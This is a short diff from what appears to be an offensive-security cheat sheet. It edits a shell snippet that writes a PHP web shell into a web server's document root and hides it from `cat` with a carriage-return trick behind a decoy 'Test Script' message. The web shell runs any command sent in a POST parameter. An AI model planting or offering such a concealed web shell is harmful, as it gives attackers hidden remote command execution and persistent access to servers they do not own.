@@ -1042,7 +1042,7 @@ Hide from `cat` with a [simple carriage return](https://www.hahwul.com/2019/01/2
 ```sh
 ### The first line will be hidden from cat
 cd /var/www/html
-echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Test Script. Do not remove...."; ?>' >test.php
+echo '<?php if(isset($_POST[0])){echo `$_POST[0]`; exit;} ?>'$'\r''<?php echo "Test Script. All OK."; ?>' >test.php
 ```
 Note the `$'\r'`: It will move the cursor back and then overwrite with the following line.
 
